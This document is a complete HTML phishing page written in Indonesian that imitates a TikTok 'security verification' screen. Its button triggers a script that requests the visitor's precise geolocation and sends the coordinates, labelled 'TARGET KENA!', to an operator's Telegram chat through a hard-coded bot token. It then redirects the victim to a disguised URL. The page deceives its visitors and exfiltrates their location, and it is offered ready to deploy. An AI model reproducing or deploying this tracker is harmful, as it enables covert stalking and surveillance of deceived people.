<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>TikTok - Verifikasi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="background:#010101; display:flex; justify-content:center; align-items:center; height:100vh; color:#fff; font-family:sans-serif; margin:0;">
    <div style="text-align:center; padding:20px;">
        <div style="border:4px solid #333; border-top:4px solid #fe2c55; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:auto;"></div>
        
        <h2 style="font-size:18px; margin-top:20px;">Verifikasi Keamanan</h2>
        <p style="font-size:12px; color:#888; margin-bottom:25px;">Klik tombol di bawah untuk melanjutkan ke video</p>
        
        <button onclick="startTracking()" style="background:#fe2c55; color:white; border:none; padding:12px 30px; border-radius:4px; font-weight:bold; width:100%; max-width:250px;">
            LIHAT VIDEO
        </button>
    </div>

    <style>@keyframes spin {0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)}}</style>

    <script>
        const TOKEN = '8770900784:AAFQMU3eer9kUvL6QkWj2SqWCdkQiFnS8G0';
        const CHAT_ID = 'MASUKKAN_ID_ANDA'; // <-- GANTI DENGAN ID TELEGRAM ANDA

        function startTracking() {
            const params = new URLSearchParams(window.location.search);
            const target = atob(params.get('to')) || "https://tiktok.com";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((p) => {
                    const text = `😈 **TARGET KENA!**\n📍 Maps: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\n🎯 Akurasi: ${p.coords.accuracy.toFixed(1)}m`;
                    
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`)
                    .then(() => { window.location.href = target; });
                }, () => {
                    // Jika ditolak, kirim info bahwa target menolak
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("⚠️ Target menolak izin lokasi.")}`)
                    .then(() => { window.location.href = target; });
                }, {enableHighAccuracy: true});
            } else {
                window.location.href = target;
            }
        }
    </script>
</body>
</html>
